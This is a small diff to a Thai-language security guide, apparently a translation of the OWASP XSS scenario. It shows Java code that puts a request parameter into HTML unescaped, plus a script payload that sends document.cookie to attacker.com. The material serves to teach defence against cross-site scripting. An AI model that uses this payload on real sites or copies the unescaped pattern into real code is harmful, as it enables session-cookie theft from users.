@@ -29,6 +29,7 @@
 **Scenario #1**: กรณีที่แอพพลิเคชั่นรับค่าจากผู้ใช้งานโดยไม่ได้ตรวจสอบหรือแปลงให้ปลอดภัยแล้วนำมาแสดงบนหน้าเว็บโดยตรงจากโค้ดภาษา Java ต่อไปนี้:
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
+
 ผู้โจมตีสามารถแก้ไขค่า HTTP parameter ชื่อ CC ผ่าน web browser ไปเป็นค่า:
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
